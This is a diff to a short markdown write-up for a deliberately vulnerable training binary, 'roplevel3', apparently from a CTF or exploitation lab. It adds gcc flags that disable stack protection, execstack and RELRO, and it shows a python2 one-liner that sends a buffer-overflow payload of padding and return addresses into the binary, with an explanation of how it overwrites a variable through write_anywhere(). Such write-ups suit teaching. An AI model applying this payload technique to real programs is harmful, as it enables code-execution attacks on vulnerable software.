@@ -1,3 +1,10 @@
+### How to compile binary (enable ASLR & PIE):
+
+```
+echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+gcc roplevel3.c -o roplevel3 -fno-stack-protector -z execstack -m32 -Wl,-z,norelro -mpreferred-stack-boundary=2
+```
+
 ### Analysis
 
 ```
@@ -91,9 +98,10 @@ End of assembler dump.
 
 ### Answer:
 
+`(python2 -c "print('ZZZZYYYYXXXXVVVV' + 'BBBB' + '\x33\x93\x04\x08' + 'CCCC' + '\x21\x93\x04\x08' + '\x44\x93\x04\x08')" ; cat)  | ./roplevel3`
 
+- Need to make sure that `eax` is not 0 which is from `[ebx+0x34]` hence execute BoF to overwrite return pointer and execute write_anywhere() function. This function will move whatever is in `ecx` into `[ebx+0x34]` which is the location of our internal_mode variable. In this case, 'BBBB' is what will be written to `ecx` in our buffer overflow.
 
-(python2 -c "print('ZZZZYYYYXXXXVVVV' + 'BBBB' + '\x33\x93\x04\x08' + 'CCCC' + '\x21\x93\x04\x08' + '\x44\x93\x04\x08')" ; cat)  | ./roplevel3
 
 
 
